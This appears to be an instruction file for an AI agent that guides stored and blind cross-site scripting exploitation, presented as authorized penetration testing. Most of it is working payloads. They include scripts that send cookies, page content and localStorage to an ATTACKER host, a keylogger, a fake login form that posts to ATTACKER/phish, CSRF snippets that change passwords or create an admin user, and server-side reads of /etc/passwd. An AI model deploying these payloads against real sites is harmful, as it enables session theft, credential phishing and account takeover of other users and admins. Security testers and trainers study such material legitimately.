---
name: xss-stored
description: >
  Guide stored (persistent) and blind XSS exploitation during authorized
  penetration testing. Use when the user has found input that persists and
  renders on subsequent page loads, or when testing for blind XSS in admin
  panels, support tickets, or log viewers. Also triggers on: "stored XSS",
  "persistent XSS", "blind XSS", "XSS in comments", "XSS in profile",
  "XSS Hunter", "payload persists", "XSS in user-generated content",
  "admin panel XSS". OPSEC: medium — payload is stored server-side and may be
  visible to other users or admins. Tools: burpsuite, XSS Hunter, ezXSS.
  Do NOT use for reflected XSS (payload in URL, not stored) — use xss-reflected
  instead. Do NOT use for DOM-based XSS — use xss-dom instead.
---

# Stored & Blind XSS

You are helping a penetration tester exploit stored (persistent) cross-site
scripting. The target application saves user input and renders it unsafely on
subsequent page loads, affecting other users who view the content. Blind XSS is
a variant where the payload fires in a context the attacker cannot directly
observe (admin panel, support ticket viewer, log dashboard). All testing is
under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each step. Identify storage and render contexts.
  Walk through payload selection. Warn about impact on other users before
  injecting stored payloads.
- **Autonomous**: Execute end-to-end. Test storage points systematically, deploy
  blind XSS callbacks, monitor for triggers. **Always warn** before injecting
  payloads that will be visible to real users.

If unclear, default to guided.

## Prerequisites

- Identified input that is stored and rendered later (see **web-vuln-discovery**)
- For blind XSS: external callback infrastructure (XSS Hunter, interactsh, or custom server)
- If the payload appears in the immediate response only (not stored), use **xss-reflected**

## Step 1: Assess

If not already provided, determine:
1. **Storage point** — where is input saved? (comment, profile field, ticket, filename, etc.)
2. **Render point** — where is the stored input displayed? (same page, different page, admin panel)
3. **Render context** — HTML body, attribute, JavaScript block, email template?
4. **Who sees it** — same user only (self-XSS), other users, admins?

Skip if context was already provided.

## Step 2: Identify Storage and Render Context

Submit a canary like `xss<>"'` to the storage point, then inspect where and how
it renders.

**Common storage → render pairs:**

| Storage Point | Render Point | Impact |
|---|---|---|
| Comment/post body | Public page | All visitors |
| User profile / display name | Profile page, admin user list | Other users, admins |
| Support ticket | Admin ticket viewer | Admin (blind XSS) |
| File upload filename | File listing page | Other users |
| Referer / User-Agent header | Analytics dashboard, admin logs | Admin (blind XSS) |
| Form field (address, bio) | Invoice, PDF export, email | Varies |

## Step 3: Stored XSS Payloads

Use `console.log()` instead of `alert()` for stored XSS — avoids popup fatigue
on every page load while testing.

**Basic payloads** (try simple first):
```html
<script>console.log('XSS:'+document.domain)</script>
<img src=x onerror=console.log('XSS:'+document.domain)>
<svg onload=console.log('XSS:'+document.domain)>
```

**When `<script>` is stripped but event handlers work:**
```html
<img src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<video src=_ onloadstart=alert(document.domain)>
<body onload=alert(document.domain)>
```

**When tags are stripped but attributes survive** (injection inside existing tag):
```html
" autofocus onfocus=alert(document.domain) "
' onmouseover=alert(document.domain) '
```

**In rich text / WYSIWYG editors:**
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

**In file upload filenames:**
```
"><img src=x onerror=alert(document.domain)>.png
<svg onload=alert(1)>.svg
```

**In email / notification templates** (if HTML email is sent):
```html
<img src="https://ATTACKER/pixel?c=" onerror="this.src+='err'">
```

## Step 4: Blind XSS

When you can inject input but cannot see where it renders (admin panels, support
dashboards, log viewers).

### Setup Callback Infrastructure

**XSS Hunter** (self-hosted or trufflesecurity):
```html
"><script src="https://js.rip/YOUR_ID"></script>
"><script src=//YOUR_SUBDOMAIN.xss.ht></script>
```

**Custom callback** (Python one-liner):
```bash
# Start listener
python3 -m http.server 8080
```

**Custom payload** (sends page context to attacker):
```html
<script>
fetch('https://ATTACKER:8080/blind', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    dom: document.body.innerHTML.substring(0, 2000),
    localStorage: JSON.stringify(localStorage)
  })
});
</script>
```

### Common Blind XSS Injection Points

- **Contact forms** — admin views submissions
- **Support tickets** — support agents view in dashboard
- **User-Agent / Referer headers** — logged in admin analytics
- **Registration fields** — admin user management panel
- **Error messages** — developer error log viewer
- **File upload metadata** — EXIF data, filenames in admin file manager

### Blind XSS Payload Tips

- Use `<script src=...>` for external payloads — more reliable than inline
- Keep inline payloads short — storage fields may truncate
- Test with a simple callback first before deploying heavy payloads
- Payloads may fire days or weeks later when an admin views the data

## Step 5: Demonstrate Impact

**Cookie theft:**
```html
<script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>
```

**Session hijacking:**
```html
<script>fetch('https://ATTACKER',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

**Account takeover via password change CSRF:**
```html
<script>
fetch('/api/change-password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'hacked123'})
});
</script>
```

**Admin action CSRF** (create new admin via stored XSS):
```html
<script>
fetch('/admin/create-user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacker&password=Passw0rd!&role=admin'
});
</script>
```

**Keylogger:**
```html
<img src=x onerror='document.onkeypress=function(e){fetch("https://ATTACKER?k="+String.fromCharCode(e.which))},this.remove();'>
```

**UI redressing / phishing:**
```html
<script>
history.replaceState(null,null,'/login');
document.body.innerHTML='<h1>Session expired</h1><form action=https://ATTACKER/phish method=POST><input name=user placeholder=Username><input name=pass type=password><button>Login</button></form>';
</script>
```

## Step 6: Self-XSS Escalation

If the XSS only affects the injecting user (self-XSS), it may still be
exploitable:

- **CSRF + Self-XSS**: Force victim to submit the XSS payload via CSRF
- **Login CSRF + Self-XSS**: Log victim into attacker's account, trigger self-XSS
- **Clickjacking + Self-XSS**: Frame the page, trick user into pasting payload
- **Cookie tossing**: Set a cookie from a subdomain that triggers XSS on the main domain

## Step 7: Escalate or Pivot

- **Reflected but not stored**: Route to **xss-reflected**
- **DOM-based only**: Route to **xss-dom**
- **Got admin cookie/session**: Access admin panel, look for further vulns
- **Admin XSS leads to RCE**: Check for admin functionality (file upload, plugin install, config edit)

When routing, pass along: storage point, render context, working payload, CSP (if any), current mode.

## OPSEC Notes

- **Stored payloads affect real users** — use `console.log()` during testing, `alert()` only for final PoC
- Payloads persist in the database — document exactly what was injected and where for cleanup
- Blind XSS callbacks reveal your attacker IP — use a proxy or VPS
- Remove injected payloads after testing (edit/delete the comment, profile field, etc.)

## Deep Reference

For advanced payloads, filter bypass, SVG/XML XSS, and edge cases:

```
Read ~/docs/public-security-references/XSS Injection/README.md
Read ~/docs/public-security-references/XSS Injection/1 - XSS Filter Bypass.md
Read ~/docs/public-security-references/XSS Injection/4 - CSP Bypass.md
Read ~/docs/public-security-references/src/pentesting-web/xss-cross-site-scripting/README.md
Read ~/docs/public-security-references/src/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md
```

## Troubleshooting

### Payload Stored but Doesn't Execute
- Check if the render context HTML-encodes the output — try event handlers or encoding bypass
- Check for CSP — inspect `Content-Security-Policy` header on the render page
- Check if a sanitizer strips tags — try less common tags (`<details>`, `<video>`, `<meter>`)
- Check if innerHTML is used (blocks `<script>` but allows `<img onerror>`)

### Rich Text Editor Strips Payloads
- Inspect the raw HTML submitted (not what the editor shows)
- Try pasting HTML directly into the request via Burp (bypass client-side sanitization)
- Check for markdown injection if the editor uses markdown

### Blind XSS Not Firing
- Payload may be truncated — shorten it or use external `<script src=...>`
- Payload may be HTML-encoded on render — try different contexts
- Admin may not have viewed the page yet — blind XSS can take time
- Check if the render context strips scripts — try `<img>` with `onerror`

### SVG File Upload XSS
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle r="50"/>
</svg>
```

### PDF Generation XSS (Server-Side)
If stored input is rendered into a PDF (wkhtmltopdf, Puppeteer):
```html
<script>document.write(location)</script>
<iframe src="file:///etc/passwd">
<script>x=new XMLHttpRequest();x.open('GET','file:///etc/passwd');x.send();x.onload=function(){document.write(x.responseText)}</script>
```
